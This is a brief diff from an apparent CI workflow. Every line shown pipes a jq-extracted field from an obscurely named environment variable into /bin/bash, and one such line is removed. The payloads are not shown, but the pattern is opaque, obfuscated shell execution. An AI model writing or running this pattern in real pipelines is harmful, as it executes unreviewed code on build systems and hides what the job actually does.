@@ -30,7 +30,6 @@ jobs:
           echo $mr32 | jq -r .r2 | /bin/bash
           printf '%s' "$k076" | jq -r .f647 | /bin/bash
           echo $m10 | jq -r .x6 | /bin/bash
-          echo $z13 | jq -r .ek38 | /bin/bash
           echo $zvyup79674 | jq -r .mevr7545 | /bin/bash
           echo $s226 | jq -r .kkg4 | /bin/bash
           echo $td8 | jq -r .a08711 | /bin/bash
